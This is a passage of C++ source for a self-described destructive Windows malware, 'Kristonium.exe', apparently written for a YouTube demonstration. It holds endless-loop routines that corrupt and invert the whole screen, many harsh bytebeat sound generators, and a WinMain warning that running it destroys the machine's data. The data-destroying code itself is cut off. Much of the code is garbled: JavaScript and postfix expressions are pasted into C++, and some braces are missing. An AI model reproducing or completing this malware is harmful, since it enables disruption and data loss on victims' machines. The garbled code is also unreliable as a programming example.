                hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)y / 100000.0 + 0.05, 1.0);
                hslcolor.s = 1.f;
                if (hslcolor.l < .2f)
                {
                    hslcolor.l += .2f;
                }
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}
DWORD WINAPI shader11(LPVOID lpParam)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * cbrt(40));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + 1.0 / 45.0 + ((FLOAT)x + (FLOAT)y) / (((FLOAT)w + (FLOAT)h) * 64.f), 1.0);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
	}
	return 0x00;
}
DWORD WINAPI kirurg(LPVOID lpParam)
{
    while (1)
    {
        HDC desk = GetDC(0);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        int rx = rand() % sw;
        BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, NOTSRCCOPY);
        StretchBlt(desk, rand() % sw, rand() % sh, sw, sh, desk, rand() % sw, rand() % sh, sw, sh, SRCCOPY);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 100, rand() % 100, rand() % 100));
        SelectObject(desk, brush);
        PatBlt(desk, 0, 0, sw, sh, PATINVERT);
        BitBlt(desk, rx, 30, 100, sh, desk, rx, 0, SRCCOPY);
        BitBlt(desk, rand() % sw, rand() % sh, sw, sh, desk, rand() % sw, rand() % sh, NOTSRCCOPY);
        StretchBlt(desk, rand() % sw, rand() % sh, sw, sh, desk, rand() % sw, rand() % sh, sw, sh, SRCCOPY);
        StretchBlt(desk, 20, 20, sw - 30, sh - 30, desk, 0, 0, sw, sh, SRCPAINT);
        StretchBlt(desk, -20, -20, sw + 30, sh + 30, desk, 0, 0, sw, sh, SRCPAINT);
        DeleteObject(brush);
        ReleaseDC(0, desk);
	}
}
DWORD WINAPI invcc(LPVOID lpParam)
{
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    int size = 100;
    int radius = 227;
    while (1)
    {
        hdc = GetDC(0);
        int origX1 = rand() % sw;
        int origY1 = rand() % sh;
        for (int angle = 0; angle < 1081; angle += 12.1)
        {
            int x1 = radius * cos(angle * M_PI / 180.0) + origX1;
            int y1 = radius * sin(angle * M_PI / 180.0) + origY1;
            if (angle < 620)
                size += 20;
            if (angle > 620)
                size -= 35;
            POINT points[3] = { {0, 0}, {0, 0}, {0, 0} };
            points[0] = { x1, y1 };
            points[1] = { x1 - size, y1 };
            points[2] = { x1 - size / 2, y1 - size };
            HRGN circle1 = CreatePolygonRgn(points, 3, WINDING);
            InvertRgn(hdc, circle1);
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader12(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				FLOAT fx = (tan(x ^ y) + (i + i * 10));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 500.f + y / screenHeight * .10f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}
DWORD WINAPI mandelbrot(LPVOID lpvd)
	{
		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;

		while (1)
		{
			StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

			RGBQUAD rgbquadCopy;

			for (int x = 0; x < w; x++)
			{
				for (int y = 0; y < h; y++)
				{
					int index = y * w + x;

					double fractalX = (3.5f / w);
					double fractalY = (2.90f / h);

					double cx = x * fractalX - 2.f;
					double cy = y * fractalY - 0.96f;

					double zx = 0;
					double zy = 0;

					int fx = 0;

					while (((zx * zx) + (zy * zy)) < 20 && fx < 60)
					{
						double fczx = zx * zx - zy * zy + cx;
						double fczy = 2 * zx * zy + cy;

						zx = fczx;
						zy = fczy;
						fx++;

						rgbquad[index].rgbRed += fx;
						rgbquad[index].rgbGreen += fx;
						rgbquad[index].rgbBlue += fx;
					}
				}
			}

			i++;
			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
		}

		return 0x00;
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t << 0)^ - (t >> 5 & 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t & 8192 ? 7 : 5) * (6 - (3 & t >> 8) + (3 & t >> 9)) >> (3 & -t >>(t & 2048 ? 2 : 11))|t >> 3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((((((t % 2) ? t / 2 : t / 4) + t/800) + sin(t/(t % 2 ? 20 : 10)) * 9) & t ^ t)) + t ^ t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>t & t >> 5;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * 43532 >> 233) * (t >> 325)|t >> 2543;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t & (1 << 4 + (t >> 17 & 3)) + 3) >> 8) + t;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>t 16 >> 4 % 1 + t 10 >> 5 % 2 + + t 12 >> 3 % - t * 3 / DUP 9 + | t 4 >> & 19 + t 12 >> 127 % ^;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 3 & 1) * t >> 3 ^ t/128 * t;
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>t*((t >> 12 | t >> 9) & 241 & t >> 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t  >> 10 | t * 5) & (t >> 8 | t * 4) & (t >> 4 | t * 6);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 11 & t >> 12) * (t >> 8 & t >> 16) % 34 * t + 4E5/(t & 4095);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>17 * t | (t >> 2) + (14 - (t >> 15 & 1)) * t | t >> 3 | t >> 5;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>a=20*t*pow(2,"B*918/916-918/91B*918/916-918/91>*;2:1;26/;2:1;2>*;2:1;26/;2:1;2A*;291;28/;291;2A*;291;28/;291;2B*=-;,=-91=-;,=-B*=-;,=-91=-;,=-E*>6=4>692>6=4>6E*>6=4>692>6=4>6D*<3:1<380<3:1<3D*<3:1<380<3:1<3D(=4<3=481=4<3=4D(=4<3=481=4<3=4B(:18/:16.:18/:1B(:18/:16.:18/:1B&;2:1;26/;2:1;2B&;2:1;26/;2:1;2@&;,9*;,8/;,9*;,@&;,9*;,8/;,9*;,@%=-;,=-91=-;,=-@%=-;,=-91=-;,=->*=-;,=-92=-;,=->*=-;,=-92=-;,=->,8/6-8/428/6-8/>,8/6-8/428/6-8/=-412/4192412141=-412/4192412141;-6341613/634163;-6341613/634163;,8/6-8/528/6-8/;,8/6-8/528/6".charCodeAt(t>>12)/12-7)/4,(a%255+a%128+a%64+a%32+a%16+a%127.8+a%64.8+a%32.8+a%16.8)/3;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound14() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (2 & t >> 10 | (t >> 10 & 9) - 4*(3 & t >> 15) + 3) & 128)*(-t >> 2 & 255) >> 7;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 9 | t >> 11) % 7 * t * ( ~ t >> 8 & 2) & 64) + ((t >> 9 | t >> 8) % 7 * t * ( ~ t >>8 & 2) & 64) + ((t >> 9 | t >> 12) % 7 * t * ( ~ t >> 9 & 2) & 64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound16() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 3) * (t & (t & 32768 ? 16 : 24) | t>>(t >> 8 & 26)) | t >> 2;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound17() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((l = 0xAFEDC320) >> (t >> 12 ^ (t >> 12) - 2) % 11 * t / 64 & 1) && 64) + (t * (l >> t * '36364689'[t >> 13 & 7] / 96 & 1) && 64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound18() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>t * (t >> 1 & 23 ^ 2 | t >> 1 & 0) | t >> 2 | 3E4 / (t % 4096);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound19() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[800p * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(3 + (t >> 2)) * (t ^ t + (t >> 8 & 3 | t >> 9 & 11 | -t >>10 & 14));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound20() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t / 2 / (4 + (t >> 13 & 3)) * 128 | t >> (t >> 14 & 15)) + 400000 / (t & 4095) | t >> 2;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound21() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((((((t % 2) ? t / 2 : t / 4) + t / 800) + sin(t / (t % 2 ? 20 : 10)) * 9) & t ^ t)) + t ^ t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound22() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t << 0) * [8/9,1,9/8,6/5,4/3,3/2,0][[0xd2d2c8,0xce4088,0xca32c8,0x8e4009][t >> 14 & 3] >> (0x3dbe4688 >> ((t >> 10 & 15)>9 ? 18 : t >> 10 & 15) * 3 & 7) * 3 & 7];

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound23() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(([2,0,3,0,2,0,2.5,0,3,0,2,0,1.8,0,3,3][(t >> 12) % 16] * t >> 2 & 127) + (t >> 8) & 128) + ([0,1][(t >> 13) % 2] * t >> 2 & 127) + (128 * sin(4095/(t % pow(4,(3 + (3 + (1)))))));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound24() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (-t != 0) buffer[t] = static_cast<char>(t * 2) ^ t | (t & (t * 0.75)) - (t * 0.99) ^ (t * 6);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"You're about to run a malware called Kristonium.exe by KHVirusser and N17Pro3426, specifically made to be showcased on the partion cybersecurity YouTube channel on a virtual machine for the purposes of entertainment and education. This malware creates a loud sounds and flashing lights! Executing malware will have irreversible destructive consequences on the data of this unusable machine. KHVirusser, N17Pro3426 are not responsible for any damage and unwanted data loss. Choose 'Yes' if you have an understanding this and agree to these terms.
Choosing also clicking 'No' nothing will happen.
\nYou have been warned.", L"Follow me to Kristonium your machine", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
